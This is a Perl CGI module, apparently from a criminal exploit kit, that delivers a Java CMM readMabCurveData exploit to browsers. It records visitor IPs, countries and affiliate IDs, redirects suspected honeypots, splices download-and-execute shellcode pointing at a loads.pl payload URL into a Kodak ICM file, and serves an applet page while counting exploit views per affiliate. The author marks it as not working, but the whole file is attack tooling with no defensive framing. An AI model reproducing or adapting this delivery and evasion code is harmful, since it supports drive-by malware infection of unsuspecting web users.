#!/usr/bin/perl

#
# Exploit Java CMM readMabCurveData exploit < java 1.6.19
# Not WORKING -___-
#

use DBI;
use CGI;
use Geo::IP;
require "../lib/Shellcode.pm";
require "../lib/JsXOR.pm";
require "../config.pl";


$q = new CGI;

$aff = $q->param('aff');
$query = $q->param('q');

#Connect to database
$db_name = 'DBI:mysql:' . $config{MysqlDB};
$dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";


########### HoneyPot Function to test ################
$theip = $ENV{REMOTE_ADDR};
$referer = $ENV{HTTP_REFERER};

#IP to Country
$gi = Geo::IP->open( '../dep/GeoIP.dat' );
my $country = $gi->country_code_by_addr($theip);

#Convert IP for database
my (@octets,$octet,$ip_number,$number_convert,$ip_address);
$ip_address = $theip;
chomp ($ip_address);
@octets = split(/\./, $ip_address);
$ip_number = 0;
foreach $octet (@octets) {
$ip_number <<= 8;
$ip_number |= $octet;
}

$doubleip = "";
$verifdoubleipch = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");
if($verifdoubleipch eq "")
{
  #Insert the system stats and check if the IP already exist
  $sql = "INSERT hosts (ip, browser, browser_version, os, os_flavor, service_pack, os_lang, country, arch, referer, aff) VALUES ('$ip_number', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', 'HoneyPot', '$country', 'HoneyPot', 'java_CMM.pl', 'HoneyPot')";
  $statement = $dbh->prepare($sql);
  $statement->execute() or $doubleip = 1;
  $doubleip = 1;
}
else
{
  $doubleip = 1;
}

######################################

if($doubleip eq "1")
{

  $checkvalueavs = "";
  #Check if ip equal to HoneyPot in database (not serving the exploit in this case)
  $checkvalueavs = $dbh->selectrow_array("SELECT os FROM hosts WHERE ip='$ip_number'");

if($checkvalueavs eq 'HoneyPot')
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}
else
{

if($query eq 'kodak')
{
  $theip = $ENV{REMOTE_ADDR}; #get ip

  #Convert IP
  my (@octets,$octet,$ip_number,$number_convert,$ip_address);
  $ip_address = $theip;
  chomp ($ip_address);
  @octets = split(/\./, $ip_address);
  $ip_number = 0;
  foreach $octet (@octets) {
  $ip_number <<= 8;
  $ip_number |= $octet;
  }

  #Get The affiliate id ( probably don't work if proxy is enabled into browser )
  $aff = $dbh->selectrow_array("SELECT aff FROM hosts WHERE ip='$ip_number'");

  #build shellcode
  $urlllll = $config{UrlToFolder} . '/loads.pl?aff=' . $aff . '&xplload=javaCMM';
  $shellcode = Shellcode::pdfgetshell($urlllll);
  
  ############# BAD SHELLCODE TOO LONG 

  #add shellcode nop till reach 494 bytes
  $dif = 494 - length($shellcode);
  while($dif > 0)
  {
    $shellcode .= "\x90";
    $dif = $dif - 1;
  }
  
  #make kodak.icm
  $urltokodak = '../dep/kodak.icm';
  $dataload = "";
  open(FILE,"<$urltokodak") || die "file cannot be openned $urltokodak\n";
  while(<FILE>)
  {
    $dataload .= $_;
  }
  close(FILE);
  
  $incvalue1 = 0;
  my @values = split('', $dataload);
  foreach my $val (@values)
  {
    if($incvalue1 < 9154)
    {  
      $str1 .= "$val";
    }
    if($incvalue1 > 9648)
    {
      $str2 .= "$val";
    }
    $incvalue1++;
  }

  $thekodakallvalue = $str1 . $shellcode . $str2;

  #send kodak.icm binary
  print $q->header(-type=> 'application/octet-stream');
  print "$thekodakallvalue";

}

if($query eq 'class')
{
  $dataload2 = "";
  $urltokodak2 = '../dep/Curve.class';

  open(FILE,"<$urltokodak2");
  while(<FILE>)
  {
    $dataload2 .= $_;
  }
  close(FILE);


$dataload2 =~ s/http:\/\/127.0.0.1\/kodak.icm/$config{UrlToFolder}\/dep\/kodak.icm/;

print $q->header(-type=> 'application/octet-stream');
print $dataload2;

}

if($query eq "" and $referer ne "")
{

  #Insert the view param on exploit
  $sql = "UPDATE exploits SET javaCMM=javaCMM+1 WHERE affid='$aff'";
  $statement = $dbh->prepare($sql);
  $statement->execute(); #or print "$DBI::errstr";

  #Insert the view param on exploit (admin)
  $sql = "UPDATE exploits SET javaCMM=javaCMM+1 WHERE affid='admin'";
  $statement = $dbh->prepare($sql);
  $statement->execute(); #or print "$DBI::errstr";

  $randomh1 = JsXOR::generate_random_string(int(rand 100));

  ##################### BEGIN PRINT HTML EXPLOIT #####################

  print $q->header;

  print '<HTML>' . "\n";
  print '<HEAD>' . "\n";
  print '</HEAD>' . "\n";
  print '<BODY>' . "\n";
  print '<H1>' . $randomh1 . '</H1>' . "\n";
  print '<P><APPLET code="./../dep/Curve.class" WIDTH="600" HEIGHT="400">' . "\n";
  print '</APPLET></P>' . "\n";
  print '</BODY>' . "\n";
  print '</HTML>' . "\n";
  
  ##################### END PRINT HTML EXPLOIT #######################
}
}
}
else
{
  #Redirect to bad page (honeypotted)
  print "Status: 301 Moved\nLocation: /nonexist.html\n\n";
}

$dbh->disconnect();

1;
